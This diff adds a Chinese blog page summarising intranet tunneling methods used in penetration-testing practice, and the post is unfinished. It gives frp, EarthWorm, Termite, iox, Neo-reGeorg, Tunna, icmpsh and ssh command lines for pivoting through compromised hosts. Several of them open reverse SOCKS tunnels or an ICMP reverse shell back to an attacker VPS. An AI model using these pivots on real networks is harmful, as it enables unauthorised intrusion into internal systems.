@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-Hans">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="敢问路在何方" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    内网穿透方法总结 |  回梦&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-内网穿透方法总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  内网穿透方法总结
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2021-04-08T04:49:27.000Z" itemprop="datePublished">2021-04-08</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">12 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近也在打内网的靶场，想总结一下，以防用到的时候不用到处找文章</p>
+<h1 id="Socks隧道"><a href="#Socks隧道" class="headerlink" title="Socks隧道"></a>Socks隧道</h1><p>实战中最理想的网络环境，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道</p>
+<h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><p>frps服务端配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure>
+<p>./frps -c frps.ini</p>
+<p>frpc客户端配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">#连接池大小，默认为0</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">#这两个为启用加密，启用后该代理和服务端之间的通信内容都会被加密传输</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+<p>./frpc -c frpc.ini</p>
+<h2 id="Ew"><a href="#Ew" class="headerlink" title="Ew"></a>Ew</h2><h3 id="一层网络"><a href="#一层网络" class="headerlink" title="一层网络"></a>一层网络</h3><p>正向代理</p>
+<p>目标主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
+<p>Kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 [攻击者公网IP] 1080</span><br></pre></td></tr></table></figure>
+<p>反向代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先在一台具有公网 ip 的主机A上运行以下命令：</span><br><span class="line">.&#x2F;ew -s rcsocks -l 1080 -e 8888 </span><br><span class="line"></span><br><span class="line">在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</span><br><span class="line">.&#x2F;ew -s rssocks -d VPS -e 8888 </span><br></pre></td></tr></table></figure>
+<h3 id="二层网络"><a href="#二层网络" class="headerlink" title="二层网络"></a>二层网络</h3><p>假设攻击者控制了主机A和主机B，主机A有公网IP但是访问不了内部资源，只能访问主机B</p>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1.png"></p>
+<p>主机A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s lcx_tran -l 1080 -f 10.10.1.2 -g 9999</span><br></pre></td></tr></table></figure>
+<p>主机B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+<p>Kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 192.168.213.156(主机A的公网IP) 1080</span><br></pre></td></tr></table></figure>
+
+
+<p>假设攻击者控制了主机A和主机B，主机A无公网IP，能出网，但是访问不了内部资源，只能访问主机B</p>
+<p>VPS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew –s lcx_listen –l 1080 –e 8888</span><br></pre></td></tr></table></figure>
+<p>主机B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+<p>主机A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s lcx_slave -d VPS:ip -e 8888 -f 10.10.1.2 -g 9999</span><br></pre></td></tr></table></figure>
+<p>Kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 [攻击者公网IP] 1080</span><br></pre></td></tr></table></figure>
+<h3 id="三层网络"><a href="#三层网络" class="headerlink" title="三层网络"></a>三层网络</h3><p>假设控制了主机AB，主机A能出网但无公网IP，主机B不出网但可被主机A访问，主机C可被主机B访问而且能够访问核心区域</p>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/3.png"></p>
+<p>VPS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+<p>主机A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s lcx_slave -d 192.168.213.170 -e 8888 -f 10.10.1.2 -g 9999</span><br></pre></td></tr></table></figure>
+<p>主机B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s lcx_listen -l 9999 -e 7777</span><br></pre></td></tr></table></figure>
+<p>主机C</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s rssocks -d 10.10.1.2 -e 7777</span><br></pre></td></tr></table></figure>
+<p>Kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 [攻击者公网IP] 1080</span><br></pre></td></tr></table></figure>
+<p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>
+<p><a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
+<h2 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h2><p>感觉比Ew更加方便使用，它可以在管理端进行操作，不过这个还要因人而异，可能每个人的使用感受都不相同</p>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">主机A</span><br><span class="line">agent_windows_x86.exe -l 8888</span><br><span class="line">管理主机</span><br><span class="line">.&#x2F;admin_linux_x86_64 -c 192.168.213.156 -p 8888</span><br><span class="line"></span><br><span class="line">假如内网机子不能出网，但是可以被web服务器访问</span><br><span class="line">主机B</span><br><span class="line">agent_windows_x86.exe -c 10.10.1.3 -p 8888</span><br></pre></td></tr></table></figure>
+<p>更详细的操作可以查看作者的视频</p>
+<p>视频教程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;toolvideo&#x2F;toolmp4&#x2F;1maintalk.mp4</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;toolvideo&#x2F;toolmp4&#x2F;2socks.mp4</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;toolvideo&#x2F;toolmp4&#x2F;3lcxtran.mp4</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;toolvideo&#x2F;toolmp4&#x2F;4shell.mp4</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;toolvideo&#x2F;toolmp4&#x2F;5file.mp4</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">在本地 0.0.0.0:1080启动Socks5服务</span><br><span class="line"></span><br><span class="line">.&#x2F;iox proxy -l 1080</span><br><span class="line">在被控机开启Socks5服务，将服务转发到公网VPS</span><br><span class="line"></span><br><span class="line">在VPS上转发0.0.0.0:9999到0.0.0.0:1080</span><br><span class="line">你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连</span><br><span class="line"></span><br><span class="line">.&#x2F;iox proxy -r 1.1.1.1:9999</span><br><span class="line">.&#x2F;iox proxy -l 9999 -l 1080       &#x2F;&#x2F; 注意，这两个端口是有顺序的</span><br><span class="line">接着连接内网主机</span><br><span class="line"></span><br><span class="line"># proxychains.conf</span><br><span class="line"># socks5:&#x2F;&#x2F;1.1.1.1:1080</span><br><span class="line"></span><br><span class="line">$ proxychains rdesktop 192.168.0.100:3389</span><br></pre></td></tr></table></figure>
+<p>更多的使用方法请参考:<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
+<h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><p>CS的话可以使用它的socks</p>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/4.png"></p>
+<p>假如要上线不出网的机器可以创建一个smb的监听器，常见木马或者pth攻击的时候，使用该监听器即可</p>
+<h1 id="HTTP隧道"><a href="#HTTP隧道" class="headerlink" title="HTTP隧道"></a>HTTP隧道</h1><h2 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h2><p>Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目</p>
+<p>根据自己设置密码，然后会在当前目录生成neoreg_servers，根据网站类型上传对应的脚本即可</p>
+<ul>
+<li><strong>Step 1.</strong> 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Step 2.</strong> 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br></pre></td></tr></table></figure>
+<p>更多使用方法请参考:<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<h2 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a>Tunna</h2><p>上传文件</p>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/5.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http:&#x2F;&#x2F;192.168.213.155&#x2F;conn.aspx -l 6983 -v</span><br></pre></td></tr></table></figure>
+<p>更多参数请参考:<a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p>
+<h1 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h1><h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>假如只有ICMP出网</p>
+<p>这个工具好像要安装impacket</p>
+<p>关闭ping命令的应答，防止内核自己对ping包进行响应</p>
+<p>sysctl -w net.ipv4.icmp_echo_ignore_all=1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#服务端</span><br><span class="line">python icmpsh_m.py VPSip 目标ip</span><br><span class="line">#目标主机</span><br><span class="line">icmpsh.exe -t VPSip</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/6.png"></p>
+<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h2 id="CS-1"><a href="#CS-1" class="headerlink" title="CS"></a>CS</h2><p>CS可以设置进行DNS上线，只要域名设置好解析即可</p>
+<h2 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h2><p>具体参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/104429983">https://blog.csdn.net/qq_36119192/article/details/104429983</a></p>
+<h1 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h1><p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">-a</span><br><span class="line">    禁止转发认证代理的连接.</span><br><span class="line">    </span><br><span class="line">-A</span><br><span class="line">    允许转发认证代理的连接. 可以在配置文件中对每个主机单独设定这个参数.</span><br><span class="line">    代理转发须谨慎. 某些用户能够在远程主机上绕过文件访问权限 (由于代理的 UNIX 域 socket), 他们可以通过转发的连接访问本地代理. 攻击者不可能从代理获得密钥内容, 但是他们能够操作这些密钥, 利用加载到代理上 的身份信息通过认证.</span><br><span class="line">    </span><br><span class="line">-b bind_address</span><br><span class="line">    在拥有多个接口或地址别名的机器上, 指定收发接口.</span><br><span class="line">    </span><br><span class="line">-c blowfish|3des|des</span><br><span class="line">    选择加密会话的密码术. 3des 是默认算法. 3des (triple-des) 用三支不同的密钥做加密-解密-加密三次运算, 被认为比较可靠. blowfish 是一种快速的分组加密术(block cipher), 非常安全, 而且速度比 3des 快的多. des 仅支持 客户端, 目的是能够和老式的不支持 3des 的协议第一版互操作. 由于其密码算法上的弱点, 强烈建议避免使用.</span><br><span class="line">    </span><br><span class="line">-c cipher_spec</span><br><span class="line">    另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的密码术. 详见 Ciphers</span><br><span class="line">    </span><br><span class="line">-e ch|^ch|none</span><br><span class="line">    设置 pty 会话的 escape 字符 (默认字符: &#96;~&#39; ) . escape 字符只在行首有效, escape 字符后面跟一个点 (&#96;.&#39; ) 表示结束连接, 跟一个 control-Z 表示挂起连接(suspend), 跟 escape 字符自己 表示输出这个字符. 把这个字符设为 &#96;&#96;none 则禁止 escape 功能, 使会话完全透明.</span><br><span class="line">-f</span><br><span class="line">    要求 在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 -n 选项. 在远端机器上启动 X11 程序的推荐手法就是类似于 ssh -f host xterm 的命令.</span><br><span class="line">    </span><br><span class="line">-g</span><br><span class="line">    允许远端主机连接本地转发的端口.</span><br><span class="line">    </span><br><span class="line">-i identity_file</span><br><span class="line">    指定一个 RSA 或 DSA 认证所需的身份(私钥)文件. 默认文件是协议第一版的 $HOME&#x2F;.ssh&#x2F;identity 以及协议第二版的 $HOME&#x2F;.ssh&#x2F;id_rsa 和 $HOME&#x2F;.ssh&#x2F;id_dsa 文件. 也可以在配置文件中对每个主机单独指定身份文件. 可以同时使用多个 -i 选项 (也可以在配置文件中指定多个身份文件).</span><br><span class="line">    </span><br><span class="line">-I smartcard_device    指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥.</span><br><span class="line">    </span><br><span class="line">-k</span><br><span class="line">    禁止转发 Kerberos 门票和 AFS 令牌. 可以在配置文件中对每个主机单独设定这个参数.</span><br><span class="line">    </span><br><span class="line">-l login_name</span><br><span class="line">    指定登录远程主机的用户. 可以在配置文件中对每个主机单独设定这个参数.</span><br><span class="line">    </span><br><span class="line">-m mac_spec</span><br><span class="line">    另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). 详情以 MACs 为关键字查询.</span><br><span class="line">    </span><br><span class="line">-n</span><br><span class="line">    把 stdin 重定向到 &#x2F;dev&#x2F;null (实际上防止从 stdin 读取数据). 在后台运行时一定会用到这个选项. 它的常用技巧是远程运行 X11 程序. 例如, ssh -n shadows.cs.hut.fi emacs 将会在 shadows.cs.hut.fi 上启动 emacs, 同时自动在加密通道中转发 X11 连接. 在后台运行. (但是如果 要求口令或密语, 这种方式就无法工作; 参见 -f 选项.)</span><br><span class="line">    </span><br><span class="line">-N</span><br><span class="line">    不执行远程命令. 用于转发端口. (仅限协议第二版)</span><br><span class="line">    </span><br><span class="line">-o option</span><br><span class="line">    可以在这里给出某些选项, 格式和配置文件中的格式一样. 它用来设置那些没有命令行开关的选项.</span><br><span class="line">    </span><br><span class="line">-p port</span><br><span class="line">    指定远程主机的端口. 可以在配置文件中对每个主机单独设定这个参数.</span><br><span class="line">    </span><br><span class="line">-q</span><br><span class="line">    安静模式. 消除所有的警告和诊断信息.</span><br><span class="line">    </span><br><span class="line">-s</span><br><span class="line">    请求远程系统激活一个子系统. 子系统是 SSH2 协议的一个特性, 能够协助 其他应用程序(如 sftp)把SSH用做安全通路. 子系统通过远程命令指定.</span><br><span class="line">    </span><br><span class="line">-t</span><br><span class="line">    强制分配伪终端. 可以在远程机器上执行任何全屏幕(screen-based)程序, 所以非常有用, 例如菜单服务. 并联的 -t 选项强制分配终端, 即使 没有本地终端.</span><br><span class="line">    </span><br><span class="line">-T</span><br><span class="line">    禁止分配伪终端.</span><br><span class="line">    </span><br><span class="line">-v</span><br><span class="line">    冗详模式. 使 打印关于运行情况的调试信息. 在调试连接, 认证和配置问题时非常有用. 并联的 -v 选项能够增加冗详程度. 最多为三个.</span><br><span class="line">-x</span><br><span class="line">    禁止 X11 转发.</span><br><span class="line">    </span><br><span class="line">-X</span><br><span class="line">    允许 X11 转发. 可以在配置文件中对每个主机单独设定这个参数.</span><br><span class="line">    应该谨慎使用 X11 转发. 如果用户在远程主机上能够绕过文件访问权限 (根据用户的X授权数据库), 他就可以通过转发的连接访问本地 X11 显示器. 攻击者可以据此采取行动, 如监视键盘输入等.</span><br><span class="line">    </span><br><span class="line">-C</span><br><span class="line">    要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP&#x2F;IP 连接 的数据). 压缩算法和 gzip(1) 的一样, 协议第一版中, 压缩级别 &#96;&#96;level 用 CompressionLevel 选项控制. 压缩技术在 modem 线路或其他慢速连接上很有用, 但是在高速网络上反而 可能降低速度. 可以在配置文件中对每个主机单独设定这个参数. 另见 Compression 选项.</span><br><span class="line">    </span><br><span class="line">-F configfile</span><br><span class="line">    指定一个用户级配置文件. 如果在命令行上指定了配置文件, 系统级配置文件 (&#x2F;etc&#x2F;ssh&#x2F;ssh_config ) 将被忽略. 默认的用户级配置文件是 $HOME&#x2F;.ssh&#x2F;config</span><br><span class="line">    </span><br><span class="line">-L port:host:hostport</span><br><span class="line">    将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port&#x2F;host&#x2F;hostport</span><br><span class="line">    </span><br><span class="line">-R port:host:hostport</span><br><span class="line">    将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机 才能转发特权端口. IPv6 地址用另一种格式说明: port&#x2F;host&#x2F;hostport</span><br><span class="line">    </span><br><span class="line">-D port</span><br><span class="line">    指定一个本地机器 &#96;&#96;动态的 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</span><br><span class="line">    </span><br><span class="line">-1</span><br><span class="line">    强制 只使用协议第一版.</span><br><span class="line">    </span><br><span class="line">-2</span><br><span class="line">    强制 只使用协议第二版.</span><br><span class="line">    </span><br><span class="line">-4</span><br><span class="line">    强制 只使用 IPv4 地址.</span><br><span class="line">    </span><br><span class="line">-6</span><br><span class="line">    强制 只使用 IPv6 地址.</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<p>没写完，后面再更</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
